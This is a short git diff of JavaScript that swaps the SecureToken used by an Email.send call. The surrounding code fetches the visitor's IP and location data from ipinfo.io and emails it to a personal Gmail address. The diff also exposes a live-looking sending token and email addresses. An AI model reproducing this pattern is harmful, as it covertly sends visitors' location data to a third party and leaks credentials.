@@ -5,7 +5,7 @@ $.getJSON('https://ipinfo.io/json', function(data) {
   console.log("ipinfo.io");
   console.log(JSON.stringify(data, null, 2));
   Email.send({
-      SecureToken : "fd5aa482-7f56-43ec-9524-fc3e28718562",
+      SecureToken : "3e7389fa-3337-4c02-bef8-139150d1bb21",
       To : 'f.crayop@gmail.com',
       From : "02gracelie2019@gmail.com",
       Subject : "ipinfo.io",
